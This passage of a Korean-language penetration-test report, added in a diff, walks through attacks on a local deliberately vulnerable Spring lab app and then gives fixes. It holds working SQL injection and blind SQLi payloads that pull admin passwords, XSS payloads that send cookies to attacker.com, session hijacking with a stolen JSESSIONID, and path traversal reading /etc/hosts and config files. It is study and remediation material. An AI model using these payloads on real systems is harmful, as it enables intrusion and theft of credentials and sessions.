+               + <span class="str">"FROM documents WHERE id = "</span>
+               + <span class="hl">docId</span>;  <span class="cm">// ★ 직접 삽입 — 따옴표 없음!</span>
+
+  <span class="cm">// 오류 메시지 그대로 출력</span>
+  results = jdbc.queryForList(query);
+}</div>
+
+        <div class="lbl">원본 쿼리 (정상 요청 시)</div>
+        <div class="code"><span class="kw">SELECT</span> id, title, content, author, category, created
+<span class="kw">FROM</span> documents <span class="kw">WHERE</span> id = <span class="num">1</span>
+<span class="cm">-- 따옴표가 없으므로 addslashes() 등 이스케이프 대책이 모두 무효</span></div>
+      </div>
+    </div>
+
+    <div class="acard">
+      <div class="acard-head">
+        <div class="acard-title">Step 2B-2 · 관리자 계정 선택 추출</div>
+        <span class="sev sev-critical">CRITICAL</span><span class="res res-ok">성공</span>
+      </div>
+      <div class="acard-body">
+        <div class="steps">
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">기본 동작 확인 — OR 1=1로 전체 레코드 조회</div>
+              <div class="code">GET /nas/doc/docDetail.do?docId=<span class="hl">1 OR 1=1</span>
+<span class="cm"># 실행: WHERE id = 1 OR 1=1 → 모든 레코드 반환</span></div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num orange">2</div>
+            <div class="step-content">
+              <div class="step-title">6컬럼 UNION으로 관리자 계정만 추출</div>
+              <div class="code">GET /nas/doc/docDetail.do?docId=<span class="hl">0 UNION SELECT id,username,password,role,email,created
+FROM users WHERE role='ADMIN'</span>
+
+<span class="cm"># docId=0 → 원본 결과 없음
+# UNION으로 관리자 계정만 주입</span></div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num red">3</div>
+            <div class="step-content">
+              <div class="step-title">서버 응답 — 관리자 자격증명 노출</div>
+              <div class="resp resp-data">ID: 1
+제목(username): <span class="hl">admin</span>
+내용(password): <span class="hl">admin1234</span>
+작성자(role):   <span class="hl">ADMIN</span>
+분류(email):    admin@nas.go.kr</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ⑤ PHASE 2-C: Blind SQLi ─────────────────────── -->
+  <div class="sec" id="sqli3">
+    <div class="sec-title">🕶️ Phase 2-C — Blind SQL Injection: 비밀번호 문자별 자동 추출</div>
+
+    <div class="hacker-box">
+      <p>
+        <code>/user/userInfo.do</code>는 결과가 화면에 직접 표시되지 않습니다 — "<strong>사용자가 존재합니다</strong>" 또는
+        "<strong>사용자가 존재하지 않습니다</strong>"라는 두 가지 응답만 돌아옵니다.
+        이것이 바로 <strong>Blind SQL Injection</strong>의 환경입니다.
+      </p>
+      <p>
+        해커는 SQL의 <code>SUBSTRING()</code> 함수와 문자 비교를 이용해 비밀번호를 한 글자씩 추출합니다.
+        <code>AND SUBSTRING(password,1,1)='a'</code>가 참이면 "존재합니다", 거짓이면 "없습니다"가 응답되고,
+        알파벳/숫자를 순서대로 대입하면 비밀번호 전체를 복원할 수 있습니다.
+      </p>
+    </div>
+
+    <div class="acard">
+      <div class="acard-head">
+        <div class="acard-title">Step 2C-1 · True / False 응답 차이 확인</div>
+        <span class="sev sev-high">HIGH</span><span class="res res-ok">성공</span>
+      </div>
+      <div class="acard-body">
+        <div class="two">
+          <div>
+            <div class="lbl">TRUE 조건 (항상 참인 조건 삽입)</div>
+            <div class="code">GET /nas/user/userInfo.do?userId=<span class="hl2">admin<span class="op">'</span> AND <span class="str">'1'</span>=<span class="str">'1</span></span>
+<span class="cm"># 실행: WHERE username = 'admin' AND '1'='1'
+# → 조건 참 → 사용자 존재</span></div>
+            <div class="resp resp-ok" style="margin-top:6px;">✅ 사용자가 <strong>존재합니다</strong> (EXISTS)</div>
+          </div>
+          <div>
+            <div class="lbl">FALSE 조건 (항상 거짓인 조건 삽입)</div>
+            <div class="code">GET /nas/user/userInfo.do?userId=<span class="hl op">admin<span class="op">'</span> AND <span class="str">'1'</span>=<span class="str">'2</span></span>
+<span class="cm"># 실행: WHERE username = 'admin' AND '1'='2'
+# → 조건 거짓 → 사용자 없음</span></div>
+            <div class="resp resp-err" style="margin-top:6px;">❌ 사용자가 <strong>존재하지 않습니다</strong> (MISSING)</div>
+          </div>
+        </div>
+        <div class="box box-info" style="margin-top:12px;">
+          <strong>핵심:</strong> 두 응답의 차이가 확인되었습니다. 이제 이 차이를 이용해 임의의 조건의 참/거짓을 판별할 수 있습니다.
+        </div>
+      </div>
+    </div>
+
+    <div class="acard">
+      <div class="acard-head">
+        <div class="acard-title">Step 2C-2 · SUBSTRING 비밀번호 문자별 추출 (자동화)</div>
+        <span class="sev sev-high">HIGH</span><span class="res res-ok">성공 — admin1234 추출</span>
+      </div>
+      <div class="acard-body">
+        <div class="lbl">추출 원리</div>
+        <div class="code"><span class="cm"># 비밀번호의 N번째 문자가 'X'인지 확인하는 쿼리</span>
+userId=admin<span class="op">'</span> <span class="kw">AND SUBSTRING</span>(password,<span class="hl">N</span>,<span class="num">1</span>)=<span class="str">'<span class="hl">X</span>'</span>
+
+<span class="cm"># 내부 실행 쿼리:</span>
+<span class="kw">SELECT COUNT</span>(*) <span class="kw">FROM</span> users
+<span class="kw">WHERE</span> username = <span class="str">'admin'</span>
+<span class="kw">AND SUBSTRING</span>(password, N, <span class="num">1</span>) = <span class="str">'X'</span>
+<span class="cm"># COUNT=1이면 "존재합니다" → 해당 위치 문자 = X</span></div>
+
+        <div class="lbl">실제 추출 과정 (순차 대입 방식)</div>
+        <div class="resp resp-data">위치 1: 'a' AND SUBSTRING(password,1,1)='a' → ✅ 존재합니다  → 문자: 'a'
+위치 2: 'd' AND SUBSTRING(password,2,1)='d' → ✅ 존재합니다  → 문자: 'd'
+위치 3: 'm' AND SUBSTRING(password,3,1)='m' → ✅ 존재합니다  → 문자: 'm'
+위치 4: 'i' AND SUBSTRING(password,4,1)='i' → ✅ 존재합니다  → 문자: 'i'
+위치 5: 'n' AND SUBSTRING(password,5,1)='n' → ✅ 존재합니다  → 문자: 'n'
+위치 6: '1' AND SUBSTRING(password,6,1)='1' → ✅ 존재합니다  → 문자: '1'
+위치 7: '2' AND SUBSTRING(password,7,1)='2' → ✅ 존재합니다  → 문자: '2'
+위치 8: '3' AND SUBSTRING(password,8,1)='3' → ✅ 존재합니다  → 문자: '3'
+위치 9: '4' AND SUBSTRING(password,9,1)='4' → ✅ 존재합니다  → 문자: '4'
+위치 10: (이후 문자 없음)
+
+→ 추출된 비밀번호: <span class="hl">admin1234</span></div>
+
+        <div class="lbl">이진 탐색으로 최적화 (AI 생성 — 요청 수 최소화)</div>
+        <div class="code"><span class="cm"># 순차 대입: 최악 36회/문자 × 9문자 = 324회 요청
+# 이진 탐색 최적화: 최대 6회/문자 × 9문자 = 54회 요청</span>
+
+<span class="cm"># 이진 탐색 예시 (ASCII 범위 32~126)</span>
+userId=admin<span class="op">'</span> <span class="kw">AND</span> ORD(SUBSTRING(password,<span class="num">1</span>,<span class="num">1</span>)) > <span class="num">79</span>-- <span class="cm"># 중간값</span>
+<span class="cm"># TRUE → 80~126 범위, FALSE → 32~79 범위
+# 반복 → log2(95) ≈ 7회로 1문자 확정</span></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ⑥ PHASE 3: XSS ───────────────────────────────── -->
+  <div class="sec" id="xss">
+    <div class="sec-title">🎭 Phase 3 — XSS: 세션 탈취 → 영속적 피해 삽입</div>
+
+    <div class="hacker-box">
+      <p>
+        SQLi로 자격증명을 탈취했지만, 해커는 여기서 멈추지 않습니다.
+        피해자가 비밀번호를 변경하면 탈취한 자격증명은 무효가 됩니다.
+        그래서 해커는 <strong>지속적인 접근을 위한 Stored XSS</strong>를 삽입합니다.
+      </p>
+      <p>
+        Stored XSS는 게시판에 한 번 삽입해 두면 이후 해당 페이지에 접속하는
+        <strong>모든 사용자의 브라우저에서 자동 실행</strong>됩니다.
+        JSESSIONID를 실시간으로 공격자 서버로 전송하도록 설정하면,
+        관리자가 로그인할 때마다 세션을 탈취할 수 있습니다.
+      </p>
+    </div>
+
+    <div class="acard">
+      <div class="acard-head">
+        <div class="acard-title">Step 3-1 · Reflected XSS — 관리자 대상 피싱 링크</div>
+        <span class="sev sev-high">HIGH</span><span class="res res-ok">성공</span>
+      </div>
+      <div class="acard-body">
+        <div class="lbl">취약 코드 분석</div>
+        <div class="code"><span class="cm">// NoticeController.java — msg 파라미터를 이스케이프 없이 Model에 전달</span>
+@GetMapping(<span class="str">"/board/notice.do"</span>)
+<span class="kw">public</span> String notice(
+    @RequestParam String msg, Model model) {
+  model.addAttribute(<span class="str">"msg"</span>, <span class="hl">msg</span>);  <span class="cm">// ★ 취약: htmlEscape 없음</span>
+  <span class="kw">return</span> <span class="str">"notice"</span>;
+}
+
+<span class="cm">// notice.jsp — EL 이스케이프 없이 출력</span>
+&lt;div class="msg-box"&gt;
+  공지: &lt;%= <span class="hl">request.getAttribute("msg")</span> %&gt;  &lt;!-- ★ 직접 출력 --&gt;
+&lt;/div&gt;</div>
+
+        <div class="lbl">공격 URL (피해자에게 전송할 피싱 링크)</div>
+        <div class="code">http://localhost:8082/nas/board/notice.do?msg=<span class="hl">&lt;script&gt;new+Image().src=
+"http://attacker.com/steal?c="+document.cookie&lt;/script&gt;</span></div>
+
+        <div class="lbl">서버 응답 HTML (브라우저에서 실행됨)</div>
+        <div class="resp resp-warn">&lt;div class="msg-box"&gt;
+  공지: <span class="hl">&lt;script&gt;new Image().src="http://attacker.com/steal?c="+document.cookie&lt;/script&gt;</span>
+&lt;/div&gt;
+
+→ 피해자 브라우저: 보이지 않는 이미지 요청으로 쿠키 전송
+→ 공격자 서버 수신: GET /steal?c=JSESSIONID=FC5CD6449E9546B1108C69D8F438F704</div>
+      </div>
+    </div>
+
+    <div class="acard">
+      <div class="acard-head">
+        <div class="acard-title">Step 3-2 · Stored XSS — 게시판에 영속 악성 스크립트 삽입</div>
+        <span class="sev sev-critical">CRITICAL</span><span class="res res-ok">성공 — DB에 저장 확인</span>
+      </div>
+      <div class="acard-body">
+        <div class="hacker-box" style="margin-bottom:16px;">
+          <p>
+            해커는 게시판 글쓰기 폼의 <code>maxlength="50"</code> 제한을 무시합니다.
+            이 제한은 HTML 폼의 클라이언트 사이드 속성일 뿐이며, curl로 직접 POST 요청을 보내면
+            서버에서 길이 검증을 하지 않으므로 무한대 길이의 페이로드를 삽입할 수 있습니다.
+          </p>
+        </div>
+
+        <div class="steps">
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">HTML maxlength 우회 — curl로 직접 POST 전송</div>
+              <div class="code"><span class="cm"># HTML 폼: maxlength="50" → 클라이언트 제한만! 서버 검증 없음
+# curl로 직접 POST → maxlength 무시</span>
+curl -X POST http://localhost:8082/nas/board/boardWrite.do \
+  -H <span class="str">"Content-Type: application/x-www-form-urlencoded"</span> \
+  --data-urlencode <span class="str">"author=anonymous"</span> \
+  --data-urlencode <span class="str">"title=시스템 공지사항"</span> \
+  --data-urlencode <span class="str">"content=<span class="hl">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span>"</span></div>
+              <div class="resp resp-data" style="margin-top:6px;">HTTP/1.1 302 Found → boardList.do (저장 성공)</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num red">2</div>
+            <div class="step-content">
+              <div class="step-title">실제 쿠키 탈취 + BeEF 훅 페이로드 저장 확인</div>
+              <div class="code"><span class="cm"># 게시판 목록 HTML에서 확인된 저장된 스크립트</span>
+&lt;td&gt;hacker&lt;/td&gt;
+&lt;td&gt;시스템 공지&lt;/td&gt;
+&lt;td&gt;<span class="hl">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span>&lt;/td&gt;
+
+<span class="cm"># 고급 버전: 세션 탈취 + 외부 전송 (btoa로 Base64 인코딩)</span>
+&lt;script&gt;
+  <span class="kw">new</span> Image().src = <span class="str">"http://attacker.com/steal?c="</span>
+    + <span class="fn">btoa</span>(document.cookie);
+&lt;/script&gt;</div>
+              <div class="resp resp-err" style="margin-top:6px;">→ 페이지 방문하는 모든 사용자의 브라우저에서 실행
+→ 공격자 서버: GET /steal?c=SlNFU1NJT05JRD1GQzVDRDY0NDLF...
+→ Base64 디코딩: JSESSIONID=FC5CD6449E9546B1108C69D8F438F704</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num purple">3</div>
+            <div class="step-content">
+              <div class="step-title">탈취한 JSESSIONID로 세션 재사용 (Session Hijacking)</div>
+              <div class="code"><span class="cm"># 공격자가 탈취한 세션으로 관리자 페이지 접근</span>
+curl -H <span class="str">"Cookie: JSESSIONID=<span class="hl">FC5CD6449E9546B1108C69D8F438F704</span>"</span> \
+  http://localhost:8082/nas/main/main.do
+<span class="cm"># → 로그인 없이 관리자 계정으로 접근 성공</span></div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ⑦ PHASE 4: PATH TRAVERSAL ───────────────────── -->
+  <div class="sec" id="traversal">
+    <div class="sec-title">📂 Phase 4 — Path Traversal: 서버 파일 시스템 탐색</div>
+
+    <div class="hacker-box">
+      <p>
+        <code>fileName</code> 파라미터가 업로드 디렉토리의 파일을 읽는 데 사용된다면,
+        <code>../</code>를 반복해 상위 디렉토리로 탈출할 수 있습니다.
+        서버가 경로를 정규화(<code>Paths.get().normalize()</code>)하거나 기준 디렉토리를 벗어나는지 검증하지 않으면
+        운영체제의 모든 파일에 접근할 수 있습니다.
+      </p>
+      <p>
+        해커가 노리는 핵심 파일은 <strong>설정 파일</strong>입니다.
+        <code>application.properties</code>에는 DB 접속 정보, 내부 서버 주소, API 키 등이 담겨 있습니다.
+        이를 탈취하면 직접 DB 서버에 연결하거나 내부망 다른 시스템으로 이동할 수 있습니다.
+      </p>
+    </div>
+
+    <div class="acard">
+      <div class="acard-head">
+        <div class="acard-title">Step 4-1 · 취약 코드 분석 및 경로 계산</div>
+        <span class="sev sev-high">HIGH</span>
+      </div>
+      <div class="acard-body">
+        <div class="lbl">취약한 Java 코드 (FileController.java)</div>
+        <div class="code"><span class="cm">// ★ 취약: fileName을 검증 없이 직접 파일 경로로 사용</span>
+<span class="kw">private static final</span> String UPLOAD_DIR =
+  System.getProperty(<span class="str">"user.dir"</span>) + <span class="str">"/uploads/"</span>;
+
+@GetMapping(<span class="str">"/file/view.do"</span>)
+<span class="kw">public</span> String viewFile(@RequestParam String fileName, ...) {
+  File file = <span class="kw">new</span> File(<span class="hl">UPLOAD_DIR + fileName</span>);  <span class="cm">// ★ 취약</span>
+  <span class="cm">// 정규화(canonical path) 없음
+  // 기준 디렉토리 확인 없음
+  // 직접 파일 읽기 실행</span>
+  reader = <span class="kw">new</span> BufferedReader(<span class="kw">new</span> FileReader(file));
+}</div>
+
+        <div class="lbl">경로 탈출 계산</div>
+        <div class="code"><span class="cm"># 서버 UPLOAD_DIR: /Users/jesper._.ch/security/Study/VulnSpringApp/uploads/
+# ↑ 각 단계: uploads → VulnSpringApp → Study → security → jesper._.ch → Users → /
+# ../×6 → 루트(/)에 도달
+
+fileName = ../../../../../../etc/hosts
+실제 경로 = /Users/.../uploads/../../../../../../etc/hosts
+          → /etc/hosts (macOS: /private/etc/hosts)</span></div>
+      </div>
+    </div>
+
+    <div class="acard">
+      <div class="acard-head">
+        <div class="acard-title">Step 4-2 · 시스템 파일 접근 — /etc/hosts</div>
+        <span class="sev sev-high">HIGH</span><span class="res res-ok">성공</span>
+      </div>
+      <div class="acard-body">
+        <div class="lbl">공격 요청</div>
+        <div class="code">GET /nas/file/view.do?fileName=<span class="hl">../../../../../../etc/hosts</span> HTTP/1.1</div>
+        <div class="lbl">서버 응답 — 시스템 파일 내용 노출</div>
+        <div class="resp resp-data">📂 요청 파일: ../../../../../../etc/hosts
+📍 실제 경로: /Users/jesper._.ch/security/Study/VulnSpringApp/uploads/../../../../../../etc/hosts
+
+<span class="hl">##
+# Host Database
+# localhost is used to configure the loopback interface
+##
+127.0.0.1    localhost
+255.255.255.255    broadcasthost
+::1          localhost</span></div>
+        <div class="box box-warn" style="margin-top:8px;">
+          hosts 파일을 통해 내부 도메인 구성, VPN 주소, 내부 서버 IP 등을 파악할 수 있습니다.
+        </div>
+      </div>
+    </div>
+
+    <div class="acard">
+      <div class="acard-head">
+        <div class="acard-title">Step 4-3 · 핵심 목표 — DB 설정 파일 탈취 (application.properties)</div>
+        <span class="sev sev-critical">CRITICAL</span><span class="res res-ok">성공</span>
+      </div>
+      <div class="acard-body">
+        <div class="hacker-box" style="margin-bottom:16px;">
+          <p>
+            해커가 가장 원하는 것은 <strong>DB 접속 정보</strong>입니다.
+            Spring Boot 프로젝트에서 <code>application.properties</code>에는
+            DB URL, username, password가 평문으로 저장됩니다.
+            이를 탈취하면 DB에 직접 접속해 모든 데이터를 덤프할 수 있습니다.
+          </p>
+        </div>
+        <div class="lbl">공격 요청 (프로젝트 구조 파악 후 정확한 경로 계산)</div>
+        <div class="code">GET /nas/file/view.do?fileName=<span class="hl">../src/main/resources/application.properties</span>
+<span class="cm"># uploads/ → ../ → VulnSpringApp/ → src/main/resources/application.properties</span></div>
+        <div class="lbl">서버 응답 — 모든 설정 정보 노출</div>
+        <div class="resp resp-data">📍 실제 경로: /Users/.../VulnSpringApp/uploads/../src/main/resources/application.properties
+
+<span class="hl"># ── 서버 설정 ──
+server.port=8082
+server.servlet.context-path=/nas
+
+# ── H2 인메모리 DB ──
+spring.datasource.url=jdbc:h2:mem:vulndb;DB_CLOSE_DELAY=-1
+spring.datasource.driver-class-name=org.h2.Driver
+spring.datasource.username=sa
+spring.datasource.password=          ← 비밀번호 없음 (즉시 접속 가능)
+
+# ── H2 콘솔 활성화 ──
+spring.h2.console.enabled=true       ← 외부에서 DB 직접 쿼리 가능
+spring.h2.console.path=/h2-console</span></div>
+        <div class="box box-danger" style="margin-top:8px;">
+          <strong>치명적 결과:</strong> H2 콘솔이 활성화되어 있고 비밀번호가 없습니다.
+          <code>http://localhost:8082/nas/h2-console</code>에 접속하면
+          브라우저에서 직접 DB를 쿼리할 수 있습니다 — 추가 인증 없이.
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ⑧ CHAIN ─────────────────────────────────────── -->
+  <div class="sec" id="chain">
+    <div class="sec-title">⛓️ 전체 공격 체인 타임라인</div>
+
+    <div class="acard">
+      <div class="acard-head"><div class="acard-title">해커의 시나리오 — 정찰부터 관리자 장악까지</div></div>
+      <div class="acard-body">
+        <div class="chain">
+          <div class="cstep"><div class="cn">PHASE 1</div><div class="cl">정찰</div><div class="cd">헤더·URL 분석</div></div>
+          <div class="carr">→</div>
+          <div class="cstep"><div class="cn">PHASE 2</div><div class="cl">취약점 탐지</div><div class="cd">단일 따옴표</div></div>
+          <div class="carr">→</div>
+          <div class="cstep"><div class="cn">PHASE 2</div><div class="cl">DB 열거</div><div class="cd">UNION SELECT</div></div>
+          <div class="carr">→</div>
+          <div class="cstep"><div class="cn">PHASE 2</div><div class="cl">자격증명 탈취</div><div class="cd">평문 비밀번호</div></div>
+          <div class="carr">→</div>
+          <div class="cstep"><div class="cn">PHASE 3</div><div class="cl">XSS 삽입</div><div class="cd">세션 탈취</div></div>
+          <div class="carr">→</div>
+          <div class="cstep"><div class="cn">PHASE 4</div><div class="cl">파일 탈취</div><div class="cd">설정파일</div></div>
+          <div class="carr">→</div>
+          <div class="cstep"><div class="cn">IMPACT</div><div class="cl">완전 장악</div><div class="cd">DB + 서버</div></div>
+        </div>
+
+        <div class="tl" style="margin-top:20px;">
+          <div class="tli recon">
+            <div class="tli-title">HTTP 응답 헤더 분석 <span class="tli-phase ph-recon">정찰</span></div>
+            <div class="tli-desc">JSESSIONID 쿠키 발견, .do URL → Java 레거시 스택 확인, extendedParam 복합 파라미터 → DB 쿼리 삽입 가능성 식별</div>
+          </div>
+          <div class="tli scan">
+            <div class="tli-title">공격 표면 매핑 — 7개 엔드포인트 식별 <span class="tli-phase ph-recon">정찰</span></div>
+            <div class="tli-desc">keyword(문자열 SQLi), docId(숫자형 SQLi), userId(Blind SQLi), msg(Reflected XSS), content(Stored XSS), fileName(Path Traversal), file(Upload)</div>
+          </div>
+          <div class="tli exploit">
+            <div class="tli-title">단일 따옴표 — DB 오류 메시지로 쿼리 구조 노출 <span class="tli-phase ph-exploit">익스플로잇</span></div>
+            <div class="tli-desc">keyword=' → H2 JdbcSQLSyntaxErrorException 노출 → 테이블명(documents), 컬럼명(5개), DB 엔진(H2 2.1.214) 완전 파악</div>
+          </div>
+          <div class="tli exploit">
+            <div class="tli-title">UNION SELECT로 전체 DB 덤프 <span class="tli-phase ph-exploit">익스플로잇</span></div>
+            <div class="tli-desc">notexist' UNION ALL SELECT username||':'||password,role,email FROM users-- - → 단 1회 요청으로 4개 계정 평문 비밀번호 탈취</div>
+          </div>
+          <div class="tli exploit">
+            <div class="tli-title">숫자형 SQLi — 관리자 계정 선택 추출 <span class="tli-phase ph-exploit">익스플로잇</span></div>
+            <div class="tli-desc">docId=0 UNION SELECT...FROM users WHERE role='ADMIN' → admin:admin1234 확인. 즉시 로그인 가능</div>
+          </div>
+          <div class="tli exploit">
+            <div class="tli-title">Blind SQLi — SUBSTRING으로 비밀번호 문자별 추출 <span class="tli-phase ph-exploit">익스플로잇</span></div>
+            <div class="tli-desc">True/False 응답 차이 확인 후 SUBSTRING(password,N,1) 순차 대입 → admin1234 완전 추출 (9자, 324회 요청)</div>
+          </div>
+          <div class="tli exfil">
+            <div class="tli-title">Stored XSS — 세션 탈취 코드 게시판 영속 삽입 <span class="tli-phase ph-exfil">탈취</span></div>
+            <div class="tli-desc">maxlength 클라이언트 우회(curl) → new Image().src=attacker.com/steal?c=btoa(cookie) DB 저장 → 모든 방문자 JSESSIONID 실시간 탈취</div>
+          </div>
+          <div class="tli exfil">
+            <div class="tli-title">Path Traversal — 설정 파일 탈취 <span class="tli-phase ph-exfil">탈취</span></div>
+            <div class="tli-desc">fileName=../../../../../../etc/hosts → 시스템 파일 접근. fileName=../src/main/resources/application.properties → DB 접속 정보 완전 노출</div>
+          </div>
+          <div class="tli persist">
+            <div class="tli-title">H2 Console + 비밀번호 없는 DB 직접 접근 <span class="tli-phase ph-persist">완전 장악</span></div>
+            <div class="tli-desc">설정 파일에서 spring.h2.console.enabled=true, 비밀번호 없음 확인 → /nas/h2-console 접속 → 브라우저에서 직접 SQL 실행, 전체 DB 제어</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ⑨ IMPACT ────────────────────────────────────── -->
+  <div class="sec" id="impact">
+    <div class="sec-title">💥 실제 피해 시나리오</div>
+
+    <div class="imp-grid">
+      <div class="imp-card">
+        <div class="imp-icon">🔐</div>
+        <div class="imp-title">자격증명 탈취 → 계정 완전 장악</div>
+        <div class="imp-desc">4개 계정(관리자 포함) 평문 비밀번호 즉시 탈취. 동일 비밀번호를 타 서비스에서도 사용 중이면 (Credential Stuffing) 연쇄 피해 발생.</div>
+      </div>
+      <div class="imp-card">
+        <div class="imp-icon">🍪</div>
+        <div class="imp-title">세션 하이재킹 → 로그인 없이 관리자 권한</div>
+        <div class="imp-desc">XSS로 탈취한 JSESSIONID를 공격자 브라우저에 삽입하면 인증 없이 관리자 세션 재사용 가능. 비밀번호 변경 후에도 세션이 살아있으면 지속 접근.</div>
+      </div>
+      <div class="imp-card">
+        <div class="imp-icon">🗄️</div>
+        <div class="imp-title">DB 전체 덤프 → 기밀 데이터 유출</div>
+        <div class="imp-desc">SQLi로 모든 테이블 접근 가능. 기밀문서 내용, 개인정보, 내부 보고서 등 DB에 저장된 모든 데이터 유출. H2 콘솔로 직접 접속하면 UI에서 쿼리 실행.</div>
+      </div>
+      <div class="imp-card">
+        <div class="imp-icon">📁</div>
+        <div class="imp-title">서버 파일 접근 → 내부 정보 탈취</div>
+        <div class="imp-desc">Path Traversal로 /etc/passwd, /etc/hosts, 설정 파일, 소스코드, 인증서 파일 접근 가능. SSH 개인키, 클라우드 자격증명(~/.aws/credentials) 탈취 시 서버 완전 장악.</div>
+      </div>
+      <div class="imp-card">
+        <div class="imp-icon">🕸️</div>
+        <div class="imp-title">지속적 XSS → 모든 방문자 피해</div>
+        <div class="imp-desc">Stored XSS는 한 번 삽입으로 무한 반복. 내부 직원이 관리 페이지 접속 시마다 세션 탈취, 키로깅, 피싱 폼 표시 가능.</div>
+      </div>
+      <div class="imp-card">
+        <div class="imp-icon">🚪</div>
+        <div class="imp-title">내부망 피벗팅 가능</div>
+        <div class="imp-desc">application.properties의 DB 접속 정보를 이용해 내부 DB 서버에 직접 연결. 내부망 다른 시스템으로 이동(Lateral Movement) 가능.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ⑩ REMEDIATION ───────────────────────────────── -->
+  <div class="sec" id="remediation">
+    <div class="sec-title">🔧 취약점 근본 원인 및 대응 방안</div>
+
+    <div class="two">
+      <div>
+        <div class="fix-card">
+          <div class="fix-title">✅ SQL Injection → Prepared Statement</div>
+          <div class="lbl">취약 코드</div>
+          <div class="code resp-err" style="border-color:rgba(255,68,68,.3)"><span class="cm">// ★ 취약 — 문자열 직접 연결</span>
+String q = <span class="str">"SELECT * FROM documents WHERE title LIKE '%"</span>
+         + <span class="hl">keyword</span> + <span class="str">"%'"</span>;</div>
+          <div class="lbl">안전 코드</div>
+          <div class="code resp-ok" style="border-color:rgba(63,185,80,.3)"><span class="cm">// ✅ 안전 — Prepared Statement</span>
+String q = <span class="str">"SELECT * FROM documents WHERE title LIKE ?"</span>;
+jdbc.queryForList(q, <span class="str">"%"</span> + keyword + <span class="str">"%"</span>);</div>
+        </div>
+
+        <div class="fix-card">
+          <div class="fix-title">✅ XSS → htmlEscape + c:out</div>
+          <div class="lbl">취약 코드</div>
+          <div class="code resp-err" style="border-color:rgba(255,68,68,.3)"><span class="cm">&lt;!-- JSP — 직접 출력 --&gt;</span>
+공지: &lt;%= request.getAttribute(<span class="str">"msg"</span>) %&gt;
+&lt;td&gt;${post.CONTENT}&lt;/td&gt;</div>
+          <div class="lbl">안전 코드</div>
+          <div class="code resp-ok" style="border-color:rgba(63,185,80,.3)"><span class="cm">&lt;!-- JSTL c:out — 자동 HTML 이스케이프 --&gt;</span>
+공지: &lt;c:out value="${msg}"/&gt;
+&lt;td&gt;&lt;c:out value="${post.CONTENT}"/&gt;&lt;/td&gt;</div>
+        </div>
+      </div>
+
+      <div>
+        <div class="fix-card">
+          <div class="fix-title">✅ Path Traversal → 경로 정규화 + 기준 디렉토리 검증</div>
+          <div class="lbl">취약 코드</div>
+          <div class="code resp-err" style="border-color:rgba(255,68,68,.3)"><span class="cm">// ★ 취약 — 경로 검증 없음</span>
+File file = <span class="kw">new</span> File(UPLOAD_DIR + <span class="hl">fileName</span>);</div>
+          <div class="lbl">안전 코드</div>
+          <div class="code resp-ok" style="border-color:rgba(63,185,80,.3)"><span class="cm">// ✅ 안전 — canonical path 검증</span>
+File base = <span class="kw">new</span> File(UPLOAD_DIR).getCanonicalFile();
+File file = <span class="kw">new</span> File(UPLOAD_DIR + fileName).getCanonicalFile();
+<span class="kw">if</span> (!file.toPath().startsWith(base.toPath())) {
+  <span class="kw">throw new</span> SecurityException(<span class="str">"Path traversal 감지"</span>);
+}</div>
+        </div>
+
+        <div class="fix-card">
+          <div class="fix-title">✅ 설정 파일 보안 강화</div>
+          <div class="code"><span class="cm"># application.properties — 운영 환경 필수 설정</span>
+
+<span class="cm"># H2 콘솔 비활성화</span>
+spring.h2.console.enabled=false
+
+<span class="cm"># DB 비밀번호 환경변수로 분리</span>
+spring.datasource.password=${DB_PASSWORD}
+
+<span class="cm"># 오류 메시지 숨김</span>
+server.error.include-message=never
+server.error.include-stacktrace=never
+
+<span class="cm"># 운영 DB 사용 시 최소 권한 계정</span>
+<span class="cm"># GRANT SELECT, INSERT ON vulndb.* TO 'appuser'@'localhost';</span></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="acard" style="margin-top:20px;">
+      <div class="acard-head"><div class="acard-title">취약점 → 원인 → 해결 원칙 요약</div></div>
+      <div class="acard-body">
+        <table class="tbl">
+          <thead><tr><th>취약점</th><th>근본 원인</th><th>올바른 해결</th><th>잘못된 해결 (우회됨)</th></tr></thead>
+          <tbody>
+            <tr>
+              <td>SQL Injection</td>
+              <td>입력값을 신뢰하고 쿼리에 직접 삽입</td>
+              <td><strong>Prepared Statement</strong> (파라미터 바인딩)</td>
+              <td><span style="color:var(--red)">addslashes, 따옴표 이스케이프</span> → 숫자형/인코딩 우회</td>
+            </tr>
+            <tr>
+              <td>XSS</td>
+              <td>출력 시 HTML 인코딩 없음</td>
+              <td><strong>htmlspecialchars / c:out</strong> (출력 인코딩)</td>
+              <td><span style="color:var(--red)">script 키워드 필터</span> → img/svg/event 우회</td>
+            </tr>
+            <tr>
+              <td>Path Traversal</td>
+              <td>파일 경로 정규화 없음</td>
+              <td><strong>canonicalPath + startsWith 검증</strong></td>
+              <td><span style="color:var(--red)">../ 문자열 제거</span> → URL 인코딩(%2e%2e%2f) 우회</td>
+            </tr>
+            <tr>
+              <td>설정 파일 노출</td>
+              <td>H2 콘솔 활성화, 평문 설정</td>
+              <td><strong>콘솔 비활성화 + 환경변수 분리</strong></td>
+              <td><span style="color:var(--red)">접근 제어 IP 제한</span> → SSRF로 우회</td>
+            </tr>
+            <tr>
+              <td>평문 비밀번호</td>
+              <td>해싱 미적용</td>
+              <td><strong>BCrypt / Argon2id</strong> (Salt + 해싱)</td>
+              <td><span style="color:var(--red)">MD5/SHA1</span> → Rainbow table 공격</td>
+            </tr>
+          </tbody>
+        </table>
+        <div class="box box-danger" style="margin-top:14px;">
+          <strong>핵심 교훈:</strong> 블랙리스트 방식(위험 문자 차단)은 항상 우회 방법이 존재합니다.
